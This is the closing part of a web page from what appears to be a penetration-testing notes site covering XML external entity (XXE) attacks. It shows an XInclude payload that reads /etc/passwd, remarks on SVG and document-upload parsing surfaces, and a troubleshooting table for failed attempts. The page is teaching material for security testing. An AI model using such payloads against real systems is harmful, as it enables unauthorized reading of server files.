+<p>An application may place your XML fragment inside a larger document and run XInclude processing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#81a1c1">&lt;probe</span> <span style="color:#8fbcbb">xmlns:xi=</span><span style="color:#a3be8c">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#81a1c1">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#81a1c1">&lt;xi:include</span> <span style="color:#8fbcbb">parse=</span><span style="color:#a3be8c">&#34;text&#34;</span> <span style="color:#8fbcbb">href=</span><span style="color:#a3be8c">&#34;file:///etc/passwd&#34;</span><span style="color:#81a1c1">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">&lt;/probe&gt;</span></span></span></code></pre></div><p>Use the exact field accepting an XML fragment. Merely parsing XML does not necessarily invoke XInclude; this is a separate processor feature. A missing-file control helps distinguish processing from plain reflection.</p>
+<h2 id="7-svg-and-document-uploads">7. SVG and document uploads<a class="anchor" href="#7-svg-and-document-uploads"></a></h2>
+<p>SVG is XML, but the server must parse it for a server-side XXE. A browser rendering an SVG is a different surface. Office-style containers may hold XML documents; editing XML inside an archive helps only if the server processes that XML with vulnerable options.</p>
+<h2 id="troubleshooting">Troubleshooting<a class="anchor" href="#troubleshooting"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Result</th>
+          <th>Next action</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>DOCTYPE is disallowed</code></td>
+          <td>This parser blocks the direct route; inspect another processing stage</td>
+      </tr>
+      <tr>
+          <td>Internal marker expands, external file does not</td>
+          <td>External entity setting, protocol restriction or permissions</td>
+      </tr>
+      <tr>
+          <td>Numeric validation error</td>
+          <td>Read error body; it may contain expanded text</td>
+      </tr>
+      <tr>
+          <td>Callback never occurs</td>
+          <td>Check reachability with the provided facility and whether external resolution is enabled</td>
+      </tr>
+      <tr>
+          <td>Empty response</td>
+          <td>Look for generated report, asynchronous import status or saved parser error</td>
+      </tr>
+  </tbody>
+</table>
+<p>Related: <a href="../ssrf/">SSRF</a>, <a href="../file-upload/">upload processing</a>.</p>
+<p>Reference: <a href="https://portswigger.net/web-security/xxe">PortSwigger XXE overview and parser surfaces</a>.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/web-expl/ssrf/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>SSRF</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/web-expl/file-upload/" class="flex align-center">
+        <span>File Upload</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        <div class="field-footer"><span>offsec-n0t3 <span aria-hidden="true">//</span> keep your findings close.</span><a href="#field-content">BACK TO TOP ↑</a></div>
+
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-establish-the-parsing-surface">1. Establish the parsing surface</a></li>
+    <li><a href="#2-internal-entity-probe">2. Internal entity probe</a></li>
+    <li><a href="#3-local-file-entity">3. Local file entity</a></li>
+    <li><a href="#4-blind-external-entity-callback">4. Blind external entity callback</a></li>
+    <li><a href="#5-external-dtd-file-extraction-in-a-matching-lab">5. External DTD file extraction in a matching lab</a></li>
+    <li><a href="#6-xinclude-cannot-control-a-doctype">6. XInclude: cannot control a DOCTYPE</a></li>
+    <li><a href="#7-svg-and-document-uploads">7. SVG and document uploads</a></li>
+    <li><a href="#troubleshooting">Troubleshooting</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  <a class="skip-link" href="#field-content">Skip to notes</a>
+<div class="reading-progress" aria-hidden="true"></div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
